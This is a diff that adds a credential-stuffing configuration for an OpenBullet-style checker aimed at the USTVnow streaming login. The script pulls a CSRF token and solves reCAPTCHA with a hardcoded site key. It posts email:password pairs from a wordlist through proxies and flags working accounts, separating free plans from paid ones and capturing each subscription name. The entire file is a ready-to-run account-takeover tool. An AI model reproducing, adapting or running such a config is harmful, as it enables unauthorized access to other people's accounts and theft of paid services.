@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "USTVNOW",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-22T02:53:46.0604585+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_page REQUEST GET "https://watch.ustvnow.com/account/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#TOKEN PARSE "<COOKIES(csrf_cookie_ustvnow)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+RECAPTCHA "https://watch.ustvnow.com/account/signin" "6LdeOQkUAAAAAL-_a0caQfqsyKF2TGJxrmEUeg45" -> VAR "RECAP" 
+#POST_login REQUEST POST "https://watch.ustvnow.com/account/login" AutoRedirect=TRUE 
+  CONTENT "csrf_ustvnow=<TOKEN>&signin_email=<USER>&g-recaptcha-response=<RECAP>&signin_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://watch.ustvnow.com/account/signin" 
+  HEADER "origin: https://watch.ustvnow.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure AND 
+    KEY "Authentication Fail!" 
+  KEYCHAIN Success OR 
+    KEY "Log out" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Free Plan" 
+#SUBSCRIPTION PARSE "<SOURCE>" LR "'subscriptionName': '" "'" Recursive=FALSE -> CAP "SUBSCRIPTION" "" "" 
